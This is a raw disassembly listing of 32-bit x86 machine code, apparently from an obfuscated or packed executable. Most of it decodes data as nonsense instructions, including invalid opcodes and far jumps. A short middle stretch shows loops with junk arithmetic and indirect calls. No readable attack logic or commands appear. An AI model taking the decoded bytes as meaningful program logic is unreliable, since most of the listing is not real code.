  40aa23:	sbb    bh,BYTE PTR es:[eax]
  40aa26:	nop
  40aa27:	push   esi
  40aa28:	pop    ebx
  40aa29:	inc    BYTE PTR [edx-0x682a9d95]
  40aa2f:	fs inc esi
  40aa31:	mov    ah,0x8c
  40aa33:	retf   0x4f3c
  40aa36:	ret    
  40aa37:	mov    edi,0x9abe92f3
  40aa3c:	test   DWORD PTR [ebx+eiz*2],ecx
  40aa3f:	jp     0x40aa7e
  40aa41:	cld    
  40aa42:	mov    al,ds:0xdd9fc0ec
  40aa47:	fiadd  DWORD PTR [edx]
  40aa49:	and    edx,esi
  40aa4b:	jb     0x40aa2a
  40aa4d:	pop    es
  40aa4e:	push   cs
  40aa4f:	leave  
  40aa50:	xor    BYTE PTR [edi+esi*4],ch
  40aa53:	arpl   WORD PTR [eax+ebx*1-0x62],dx
  40aa57:	xchg   DWORD PTR [ebp+0x5c74253a],edi
  40aa5d:	cmp    dh,ah
  40aa5f:	cmp    eax,ebp
  40aa61:	in     eax,0x5
  40aa63:	sub    ebx,DWORD PTR [edi]
  40aa65:	pop    ebx
  40aa66:	ds out dx,al
  40aa68:	mov    ebp,0xc4830c9b
  40aa6d:	add    eax,0xa77fcc43
  40aa72:	mov    ebx,0x5b1522c3
  40aa77:	in     al,0x9
  40aa79:	repz popa 
  40aa7b:	xor    ebx,DWORD PTR [ecx]
  40aa7d:	imul   ebx,DWORD PTR [edx+0x76],0xffffff99
  40aa81:	jmp    DWORD PTR [ebx+0x1f1e5e47]
  40aa87:	in     al,0x9c
  40aa89:	and    eax,0xda777c0d
  40aa8e:	pop    edi
  40aa8f:	inc    ecx
  40aa90:	jne    0x40ab0c
  40aa92:	jg     0x40ab09
  40aa94:	aas    
  40aa95:	push   esi
  40aa96:	je     0x40aa4c
  40aa98:	sbb    eax,0xa67688da
  40aa9d:	jl     0x40aad4
  40aa9f:	mov    eax,ds:0x7d7783ba
  40aaa4:	xchg   BYTE PTR [edx-0x142fd9d0],ah
  40aaaa:	das    
  40aaab:	pop    ebx
  40aaac:	out    0xb7,al
  40aaae:	inc    ebx
  40aaaf:	dec    eax
  40aab0:	nop
  40aab1:	(bad)  
  40aab2:	mov    ebp,0x6c0e362
  40aab7:	mov    BYTE PTR [esi-0x30],bl
  40aaba:	(bad)  
  40aabb:	xor    BYTE PTR [edx],dl
  40aabd:	cmp    BYTE PTR [esi],dl
  40aabf:	ds inc ecx
  40aac1:	idiv   BYTE PTR [eax+0xb827735]
  40aac7:	in     al,dx
  40aac8:	mov    edx,0xbf5ff121
  40aacd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aace:	js     0x40aa65
  40aad0:	jnp    0x40aaed
  40aad2:	push   es
  40aad3:	inc    ebp
  40aad4:	cld    
  40aad5:	ja     0x40ab34
  40aad7:	popa   
  40aad8:	sbb    DWORD PTR ds:0x9d8726e8,edi
  40aade:	out    dx,eax
  40aadf:	into   
  40aae0:	sub    eax,0x4cadb739
  40aae5:	cmp    BYTE PTR [eax-0x1e328f27],ch
  40aaeb:	inc    ebx
  40aaec:	dec    esi
  40aaed:	sbb    esp,esp
  40aaef:	push   esi
  40aaf0:	mov    cl,ch
  40aaf2:	add    BYTE PTR [edi],ah
  40aaf4:	lea    esi,[esi+0xb]
  40aaf7:	sbb    DWORD PTR [edi+0x25718090],ebx
  40aafd:	sbb    esp,ebx
  40aaff:	popf   
  40ab00:	mov    fs,WORD PTR [edi]
  40ab02:	loop   0x40aad2
  40ab04:	jmp    0x73e7:0x22edda03
  40ab0b:	mul    dl
  40ab0d:	sbb    eax,DWORD PTR [ebp+0x5d]
  40ab10:	cmc    
  40ab11:	and    eax,0xe7a50551
  40ab16:	daa    
  40ab17:	cmp    dl,BYTE PTR [eax-0x4edf4c16]
  40ab1d:	push   ecx
  40ab1e:	aam    0xfb
  40ab20:	push   0x35
  40ab22:	nop
  40ab23:	ins    DWORD PTR es:[edi],dx
  40ab24:	cmp    ebx,DWORD PTR [ebx+0x2a]
  40ab27:	stos   DWORD PTR es:[edi],eax
  40ab28:	sub    ch,dh
  40ab2a:	scas   eax,DWORD PTR es:[edi]
  40ab2b:	daa    
  40ab2c:	xor    edi,DWORD PTR [esi-0x3b]
  40ab2f:	add    eax,0xce19c59c
  40ab34:	icebp  
  40ab35:	bound  edx,QWORD PTR [ebp+0x433313c7]
  40ab3b:	cwde   
  40ab3c:	(bad)  
  40ab3d:	jmp    0x8bea34e2
  40ab42:	cmp    bh,BYTE PTR [ecx]
  40ab44:	aam    0xcc
  40ab46:	int    0xa3
  40ab48:	lea    ecx,[eax+0x7a]
  40ab4b:	xor    BYTE PTR [eax-0x1a],ch
  40ab4e:	mov    esi,0xebf3f4aa
  40ab53:	iret   
  40ab54:	mov    eax,0xf9e5a320
  40ab59:	test   al,0xe5
  40ab5b:	mov    ebp,0x51a22514
  40ab60:	out    dx,eax
  40ab61:	push   ebx
  40ab62:	ret    0x2461
  40ab65:	out    0xe2,al
  40ab67:	test   BYTE PTR es:[edx+0x17],dl
  40ab6b:	test   al,0x5f
  40ab6d:	jnp    0x40abb6
  40ab6f:	pop    esp
  40ab70:	add    dl,BYTE PTR [ebx]
  40ab72:	les    ebp,FWORD PTR [ecx-0x38]
  40ab75:	iret   
  40ab76:	in     eax,dx
  40ab77:	cmp    BYTE PTR [edi+0x17],dl
  40ab7a:	ret    
  40ab7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab7c:	dec    esi
  40ab7d:	sub    BYTE PTR [ecx+0x481da540],0x77
  40ab84:	inc    eax
  40ab85:	cs fwait
  40ab87:	or     al,BYTE PTR [ebp-0x2]
  40ab8a:	mov    BYTE PTR [ebx+ebp*8-0x75],al
  40ab8e:	(bad)  
  40ab8f:	(bad)  
  40ab90:	push   edi
  40ab91:	push   edi
  40ab92:	mov    ah,0x3f
  40ab94:	mov    esp,0xdb3c8b92
  40ab99:	sbb    DWORD PTR [edx+0x350e79b7],edx
  40ab9f:	and    eax,0x7a13571e
  40aba4:	int3   
  40aba5:	ret    
  40aba6:	aaa    
  40aba7:	jp     0x40abdb
  40aba9:	mov    ds:0x3744233e,eax
  40abae:	sti    
  40abaf:	mov    edi,0x4a4185b4
  40abb4:	in     al,dx
  40abb5:	fld    DWORD PTR [edi]
  40abb7:	xor    eax,0xea4a1c57
  40abbc:	push   ebx
  40abbd:	adc    edx,edi
  40abbf:	sti    
  40abc0:	jno    0x40abc6
  40abc2:	daa    
  40abc3:	cli    
  40abc4:	shl    BYTE PTR [ecx+0x7e],1
  40abc7:	mov    ds:0x78b53cd1,eax
  40abcc:	scas   eax,DWORD PTR es:[edi]
  40abcd:	inc    BYTE PTR [edi+0x4a]
  40abd0:	sti    
  40abd1:	stos   BYTE PTR es:[edi],al
  40abd2:	add    eax,DWORD PTR [ebx]
  40abd4:	arpl   WORD PTR [ebx+eax*4-0x5b],cx
  40abd8:	out    dx,al
  40abd9:	push   eax
  40abda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abdb:	mov    WORD PTR [edx],ss
  40abdd:	js     0x40abeb
  40abdf:	loopne 0x40ac52
  40abe1:	js     0x40ab65
  40abe3:	sbb    dh,0x3e
  40abe6:	in     eax,dx
  40abe7:	retf   0xe4c1
  40abea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abeb:	arpl   WORD PTR [ebp+edi*4+0x52],dx
  40abef:	scas   eax,DWORD PTR es:[edi]
  40abf0:	fild   DWORD PTR [eax+eax*1]
  40abf3:	pop    eax
  40abf4:	inc    edx
  40abf5:	push   ebp
  40abf6:	and    edx,DWORD PTR [ebx]
  40abf8:	dec    edi
  40abf9:	pop    esi
  40abfa:	addr16 inc ebp
  40abfc:	pushf  
  40abfd:	lds    ecx,FWORD PTR [edi-0x48]
  40ac00:	xor    edx,eax
  40ac02:	xor    DWORD PTR ds:0x42fcf5,0x42e70f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e703,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ad6a
  40adb4:	push   ds
  40adb5:	in     eax,dx
  40adb6:	test   BYTE PTR [ebx],al
  40adb8:	std    
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ae32
  40adc0:	mov    al,0x30
  40adc2:	call   0xb54a:0xdcd28be2
  40adc9:	hlt    
  40adca:	pop    ecx
  40adcb:	mov    bh,0xfb
  40adcd:	cmp    DWORD PTR [ebp-0x13a23054],esi
  40add3:	sbb    bl,ch
  40add5:	loope  0x40ada3
  40add7:	push   ecx
  40add8:	aad    0x19
  40adda:	sub    BYTE PTR [edi-0x6897e07c],dh
  40ade0:	push   esp
  40ade1:	mov    esi,0x23b0330a
  40ade6:	adc    BYTE PTR [edi+0x62df3b9c],bh
  40adec:	jmp    0x4a33:0xe9637175
  40adf3:	or     eax,DWORD PTR [esi-0x5711dbb]
  40adf9:	mov    dh,0x1
  40adfb:	fidiv  DWORD PTR [edx+0x36]
  40adfe:	fisttp WORD PTR [edi]
  40ae00:	(bad)  
  40ae01:	es mov bh,0x63
  40ae04:	jmp    0xcde2:0xa6ed9ec1
  40ae0b:	mov    WORD PTR [ecx+0x5b],es
  40ae0e:	pop    es
  40ae0f:	test   al,0xf
  40ae11:	pop    esp
  40ae12:	jle    0x40adfb
  40ae14:	call   0xc99274d4
  40ae19:	std    
  40ae1a:	lss    ebp,FWORD PTR [ebp-0x52]
  40ae1e:	sbb    esp,DWORD PTR ds:0xfb4a2256
  40ae24:	xor    bh,BYTE PTR [edx+ebx*4-0x1dea8530]
  40ae2b:	stc    
  40ae2c:	push   ds
  40ae2d:	mov    bh,0x11
  40ae2f:	mov    bl,0xc7
  40ae31:	mov    cl,0xeb
  40ae33:	push   cs
  40ae34:	push   0xffffffc4
  40ae36:	in     eax,0x67
  40ae38:	ss push esi
  40ae3a:	mov    edx,0x18f0cb3d
  40ae3f:	mov    ah,0x7e
  40ae41:	out    0x21,eax
  40ae43:	push   eax
  40ae44:	cmp    esi,DWORD PTR [ebp-0x27bb72da]
  40ae4a:	xor    esi,0xffffffe9
  40ae4d:	call   0x889f:0xd44099fc
  40ae54:	mov    ebx,0x6166e5dd
  40ae59:	mov    esi,0xb16b8488
  40ae5e:	or     eax,0x15787333
  40ae63:	ret    0x1976
  40ae66:	inc    esp
  40ae67:	mov    edx,DWORD PTR [edx+0x7fa98ce3]
  40ae6d:	cmp    edx,ebx
  40ae6f:	xor    eax,0xb17c5009
  40ae74:	sahf   
  40ae75:	inc    ebx
  40ae76:	sbb    edi,ebp
  40ae78:	test   BYTE PTR [eax-0x26ddd44c],ch
  40ae7e:	das    
  40ae7f:	add    al,0x68
  40ae81:	lods   eax,DWORD PTR ds:[esi]
  40ae82:	fsub   DWORD PTR [ebx]
  40ae84:	fcomp  QWORD PTR [ebp-0x26869b74]
  40ae8a:	adc    DWORD PTR [esp+ebp*2],eax
  40ae8d:	add    ebp,ebp
  40ae8f:	sbb    ch,BYTE PTR [esi-0x2d]
  40ae92:	fld    st(1)
  40ae94:	fwait
  40ae95:	dec    esi
  40ae96:	popf   
  40ae97:	pop    ds
  40ae98:	nop
  40ae99:	repz xchg esp,eax
  40ae9b:	fwait
  40ae9c:	add    dh,al
  40ae9e:	cmp    BYTE PTR [ecx+0x54],0x25
  40aea2:	sub    BYTE PTR [ebx-0x6c],ah
  40aea5:	mov    ebx,0xfe8087da
  40aeaa:	add    eax,0x2b11bc8d
  40aeaf:	cmp    al,0xc6
  40aeb1:	or     BYTE PTR [edx+ecx*2+0x1068c70],bh
  40aeb8:	jg     0x40ae6f
  40aeba:	mov    ah,0xc9
  40aebc:	jno    0x40ae61
  40aebe:	sub    eax,0x5edf6f68
  40aec3:	sbb    eax,0x48bc23b8
  40aec8:	sub    DWORD PTR [ecx+0x73],0xbb6608ff
  40aecf:	push   eax
  40aed0:	imul   esi,DWORD PTR [ebx+eax*8+0x20c5aa80],0xffffffb4
  40aed8:	test   DWORD PTR [ecx-0x71],eax
  40aedb:	and    esi,DWORD PTR [ecx+0x23]
  40aede:	aaa    
  40aedf:	and    ebp,DWORD PTR [esi-0x4e2b3001]
  40aee5:	es add eax,0xe94bb8b8
  40aeeb:	inc    eax
  40aeec:	push   cs
  40aeed:	std    
  40aeee:	cdq    
  40aeef:	sahf   
  40aef0:	(bad)  
  40aef1:	call   0xbe20:0x9122ac26
  40aef8:	pop    esi
  40aef9:	std    
  40aefa:	sbb    ebx,esp
  40aefc:	cmp    al,0xf1
  40aefe:	nop
  40aeff:	mov    eax,ds:0xdaa4faa6
  40af04:	sahf   
  40af05:	cmp    eax,DWORD PTR [ebx+0x2d]
  40af08:	cld    
  40af09:	fwait
  40af0a:	and    ebx,edi
  40af0c:	xchg   DWORD PTR [esi+0x6ddb4ae9],ecx
  40af12:	sub    al,0x44
  40af14:	loope  0x40af70
  40af16:	cdq    
  40af17:	pop    ebx
  40af18:	adc    DWORD PTR [ebp-0x2723314f],0x10
  40af1f:	and    al,0xc
  40af21:	sbb    DWORD PTR [eax+eiz*4+0x17],ebp
  40af25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af26:	inc    edi
  40af27:	stos   DWORD PTR es:[edi],eax
  40af28:	adc    dl,dl
  40af2a:	mov    ds:0xdba4cf8d,al
  40af2f:	push   edx
  40af30:	adc    esp,DWORD PTR [ebx-0x62]
  40af33:	sub    eax,DWORD PTR [eax+0x4e]
  40af36:	pop    ebx
  40af37:	pop    edi
  40af38:	lods   al,BYTE PTR ds:[esi]
  40af39:	(bad)  
  40af3a:	js     0x40af7d
  40af3c:	mov    bh,0xf3
  40af3e:	shl    BYTE PTR [ecx-0x4d363c9d],cl
  40af44:	sub    eax,0xbab262ea
  40af49:	jb     0x40af2f
  40af4b:	adc    ebp,DWORD PTR [edi+0x61ff3178]
  40af51:	jmp    0x8f036ea2
  40af56:	shl    DWORD PTR [ebx],1
  40af58:	loope  0x40af33
  40af5a:	mov    cl,0x8f
  40af5c:	stc    
  40af5d:	mov    esi,edi
  40af5f:	or     eax,DWORD PTR ds:0x502f0fc8
  40af65:	js     0x40af98
  40af67:	mov    ecx,0x7d980e1
  40af6c:	fld    DWORD PTR [ebx-0x1d]
  40af6f:	ins    DWORD PTR es:[edi],dx
  40af70:	pop    edx
  40af71:	in     eax,dx
  40af72:	mov    edx,0xe7ff1b2b
  40af77:	in     al,0x1a
  40af79:	and    cl,bh
  40af7b:	lods   eax,DWORD PTR ds:[esi]
  40af7c:	sti    
  40af7d:	shl    BYTE PTR [eax-0x55],cl
  40af80:	xchg   ebp,eax
  40af81:	icebp  
  40af82:	xchg   ebp,eax
  40af83:	iret   
  40af84:	ss dec edi
  40af86:	mov    ebx,0x17cd9056
  40af8b:	sti    
  40af8c:	adc    eax,0x99023963
  40af91:	inc    ebx
  40af92:	xor    al,0xa0
  40af94:	xchg   BYTE PTR [ecx],cl
  40af96:	sub    BYTE PTR [edx],dh
  40af98:	(bad)  
  40af9a:	inc    ecx
  40af9b:	mov    ebp,DWORD PTR [ebx-0x7e]
  40af9e:	push   0x5aff0115
  40afa3:	aaa    
  40afa4:	adc    ebx,DWORD PTR [edx+0x1494df38]
  40afaa:	xor    ebp,eax
  40afac:	outs   dx,DWORD PTR fs:[esi]
  40afae:	sbb    ebx,ebx
  40afb0:	sub    esi,ebp
  40afb2:	add    DWORD PTR [ebp-0x24],ecx
  40afb5:	cmp    DWORD PTR [ecx+ebp*2+0x692de4da],edi
  40afbc:	push   0xffffff98
  40afbe:	mov    edi,ecx
  40afc0:	rcl    BYTE PTR [eax],1
  40afc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afc3:	jl     0x40afb3
  40afc5:	mov    edx,DWORD PTR [ebx-0x48]
  40afc8:	std    
  40afc9:	or     bl,BYTE PTR ds:0xe6e886db
  40afcf:	push   ss
  40afd0:	or     DWORD PTR [ebx],0x26
  40afd3:	mov    edx,0x6cfeea42
  40afd8:	daa    
  40afd9:	jecxz  0x40b02d
  40afdb:	cmc    
  40afdc:	loopne 0x40afd2
  40afde:	das    
  40afdf:	push   0xffffffeb
  40afe1:	jnp    0x40afb7
  40afe3:	mov    ebx,0xcffbc48c
  40afe8:	or     edi,esp
  40afea:	test   eax,0x3be1e4e
  40afef:	test   al,0xa6
  40aff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aff2:	and    BYTE PTR [esi+0x6e],dl
  40aff5:	and    al,BYTE PTR gs:[esi]
  40aff8:	push   ss
  40aff9:	sub    edx,DWORD PTR [esi+0x467e15d1]
  40afff:	xor    al,0xea
  40b001:	fimul  DWORD PTR [esi+eax*8-0x5c6558a5]
  40b008:	mov    dh,0x69
  40b00a:	enter  0xb339,0x29
  40b00e:	in     eax,dx
  40b00f:	lods   eax,DWORD PTR ds:[esi]
  40b010:	cli    
  40b011:	jge    0x40afe8
  40b013:	push   ebp
  40b014:	inc    ebp
  40b015:	rcl    DWORD PTR [bp+di+0x33],cl
  40b019:	xor    esp,esi
  40b01b:	leave  
  40b01c:	cmp    BYTE PTR [ebp*1+0x606efad5],ah
  40b023:	pop    eax
  40b024:	xchg   ebx,eax
  40b025:	dec    eax
  40b026:	inc    ebx
  40b027:	loopne 0x40afc8
  40b029:	(bad)  
  40b02a:	sub    eax,0xaef40f0f
  40b02f:	test   DWORD PTR [ecx+0x17],ebp
  40b032:	test   DWORD PTR [ebx-0x3c],edx
  40b035:	dec    DWORD PTR [ebx+0x16]
  40b038:	mul    BYTE PTR [edx]
  40b03a:	push   ebp
  40b03b:	test   BYTE PTR [edi-0xf],bh
  40b03e:	fistp  QWORD PTR [esi+ecx*4]
  40b041:	sbb    al,BYTE PTR [edi-0x59f979ba]
  40b047:	adc    al,0x2f
  40b049:	push   ebx
  40b04a:	pop    esi
  40b04b:	fldenv [ebp-0x9fd5d00]
  40b051:	or     edx,DWORD PTR [eax-0x40]
  40b054:	and    DWORD PTR [ecx+eax*1-0x2c],edi
  40b058:	jl     0x40b0cc
  40b05a:	xor    esi,DWORD PTR [edx+0x5f0ee48c]
  40b060:	mov    edx,DWORD PTR ds:0x70e5b96f
  40b066:	arpl   WORD PTR [edi-0x19],sp
  40b069:	add    dh,ch
  40b06b:	add    al,0x42
  40b06d:	jmp    0x707f:0x6f519612
  40b074:	(bad)  
  40b075:	in     al,0x51
  40b077:	pushf  
  40b078:	sub    bl,BYTE PTR [ebp+0xb]
  40b07b:	adc    al,0xe9
  40b07d:	xchg   edi,eax
  40b07e:	ror    DWORD PTR cs:[ecx-0x49d9293e],0x7c
  40b086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b087:	(bad)  
  40b088:	test   al,0xa6
  40b08a:	in     eax,dx
  40b08b:	(bad)  
  40b08c:	int3   
  40b08d:	xchg   edi,eax
  40b08e:	push   cs
  40b08f:	fxch   st(2)
  40b091:	bound  ecx,QWORD PTR [ebx+eax*1-0x1f]
  40b095:	out    0xe3,eax
  40b097:	mov    cl,0x80
  40b099:	jo     0x40b050
  40b09b:	dec    esi
  40b09c:	push   0x6a
  40b09e:	fistp  WORD PTR [eax-0x56]
  40b0a1:	pop    edx
  40b0a2:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40b0a4:	pop    edi
  40b0a5:	enter  0x4d3a,0x3a
  40b0a9:	inc    ebp
  40b0aa:	xchg   DWORD PTR [ebx],esi
  40b0ac:	cmp    BYTE PTR [ecx+0x16],ah
  40b0af:	adc    ebx,eax
  40b0b1:	rcr    DWORD PTR [ebx],0x2a
  40b0b4:	or     ecx,ecx
  40b0b6:	ffree  st(5)
  40b0b8:	jne    0x40b100
  40b0ba:	or     al,0xff
  40b0bc:	lea    edi,[ecx]
  40b0be:	dec    eax
  40b0bf:	push   eax
  40b0c0:	cld    
  40b0c1:	call   0xf472:0xed5ee829
  40b0c8:	std    
  40b0c9:	out    dx,al
  40b0ca:	xchg   ebp,eax
  40b0cb:	js     0x40b095
  40b0cd:	inc    ebx
  40b0ce:	cld    
  40b0cf:	and    DWORD PTR [ebx],0x5080b090
  40b0d5:	mov    esp,0x276ac14d
  40b0da:	xchg   BYTE PTR [eax+ebx*4+0x41],al
  40b0de:	jg     0x40b0d7
  40b0e0:	je     0x40b065
  40b0e2:	mov    ch,0x90
  40b0e4:	push   eax
  40b0e5:	push   ecx
  40b0e6:	and    eax,0x2102af33
  40b0eb:	rcl    BYTE PTR [ebx-0x57004000],cl
  40b0f1:	xlat   BYTE PTR ds:[ebx]
  40b0f2:	mov    edx,ebp
  40b0f4:	or     bl,BYTE PTR [ecx+eax*4+0x39518596]
  40b0fb:	xor    eax,0xe4a073ce
  40b100:	fs fs out 0xce,al
  40b104:	gs dec ebx
  40b106:	ins    DWORD PTR es:[edi],dx
  40b107:	lahf   
  40b108:	xor    al,0x69
  40b10a:	jnp    0x40b10d
  40b10c:	jae    0x40b0fa
  40b10e:	mov    ebp,0x832dfe54
  40b113:	pop    ecx
  40b114:	adc    bh,bl
  40b116:	(bad)  
  40b118:	ss mov esp,edx
  40b11b:	inc    eax
  40b11c:	test   eax,0x87a4e1f
  40b121:	out    0xbe,eax
  40b123:	push   0xffffffc1
  40b125:	sub    ecx,edx
  40b127:	mov    al,0xb8
  40b129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b12a:	jecxz  0x40b1a4
  40b12c:	sbb    BYTE PTR ds:0x9af6ef4c,ch
  40b132:	xor    eax,0x87c59c32
  40b137:	jecxz  0x40b0ef
  40b139:	mov    al,ds:0x84261412
  40b13e:	add    bl,dl
  40b140:	outs   dx,DWORD PTR ds:[esi]
  40b141:	(bad)  
  40b142:	dec    ebx
  40b143:	sbb    al,0x4f
  40b145:	loope  0x40b19c
  40b147:	fimul  WORD PTR [eax+eiz*1-0xe]
  40b14b:	inc    eax
  40b14c:	sub    DWORD PTR [ebp+0x3c],0xffffffe7
  40b150:	loope  0x40b11e
  40b152:	test   eax,0x5bef6caf
  40b157:	adc    BYTE PTR [ebx],cl
  40b159:	pusha  
  40b15a:	and    ebp,ebp
  40b15c:	in     eax,dx
  40b15d:	test   DWORD PTR [eax],ebp
  40b15f:	xchg   BYTE PTR [ebx],al
  40b161:	shr    ecx,1
  40b163:	mov    ecx,0xd2000003
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	fadd   QWORD PTR [eax]
  40b175:	rcl    BYTE PTR [esi+0x7070faa2],cl
  40b17b:	lahf   
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b1f0
  40b180:	adc    eax,0x7c16cd94
  40b185:	popa   
  40b186:	ds sub al,0x0
  40b189:	stos   DWORD PTR es:[edi],eax
  40b18a:	xor    dh,al
  40b18c:	in     al,dx
  40b18d:	call   0x60197c42
  40b192:	fscale 
  40b194:	out    dx,eax
  40b195:	adc    al,0xf9
  40b197:	xchg   edx,eax
  40b198:	inc    eax
  40b199:	or     BYTE PTR [ebx+0x5],dh
  40b19c:	jge    0x40b1ee
  40b19e:	push   esi
  40b19f:	mov    ecx,0x79c1bab0
  40b1a4:	loopne 0x40b195
  40b1a6:	dec    ebx
  40b1a7:	test   DWORD PTR [edi],edx
  40b1a9:	mov    ecx,0x8b597880
  40b1ae:	ja     0x40b221
  40b1b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1b1:	in     al,dx
  40b1b2:	aas    
  40b1b3:	add    eax,0x2aa244c0
  40b1b8:	pusha  
  40b1b9:	cld    
  40b1ba:	sub    esi,DWORD PTR ds:0xbc36f295
  40b1c0:	out    dx,al
  40b1c1:	push   ecx
  40b1c2:	lods   al,BYTE PTR ds:[esi]
  40b1c3:	add    al,bh
  40b1c5:	clts   
  40b1c7:	xor    DWORD PTR [esi+esi*8+0x4d],ecx
  40b1cb:	ret    0x57d
  40b1ce:	fild   DWORD PTR [eax-0x434f2202]
  40b1d4:	das    
  40b1d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1d6:	in     al,0x48
  40b1d8:	les    ecx,FWORD PTR [edi-0x4a]
  40b1db:	pop    ebx
  40b1dc:	adc    al,0xcd
  40b1de:	js     0x40b169
  40b1e0:	push   0xf784154f
  40b1e5:	aam    0x4b
  40b1e7:	sahf   
  40b1e8:	repnz mov cs,WORD PTR [eax-0x3f4df1a6]
  40b1ef:	dec    ecx
  40b1f0:	mov    esi,0xdd5dbead
  40b1f5:	cli    
  40b1f6:	xchg   ebp,eax
  40b1f7:	push   edi
  40b1f8:	xor    ch,dl
  40b1fa:	inc    ebx
  40b1fb:	push   ebx
  40b1fc:	rcr    DWORD PTR [ebp+eiz*1+0x352d3b5a],0x9c
  40b204:	imul   ebp,esp,0x125bfe5
  40b20a:	dec    ecx
  40b20b:	pop    ebp
  40b20c:	iret   
  40b20d:	out    0xe0,al
  40b20f:	(bad)  
  40b210:	je     0x40b279
  40b212:	push   edx
  40b213:	lea    edx,ds:0xba529bfa
  40b219:	loope  0x40b222
  40b21b:	or     cl,BYTE PTR [ebx]
  40b21d:	outs   dx,DWORD PTR ds:[esi]
  40b21e:	out    dx,eax
  40b21f:	and    ecx,DWORD PTR [ebp+0x6e91519]
  40b225:	and    dh,BYTE PTR [esi+0x31]
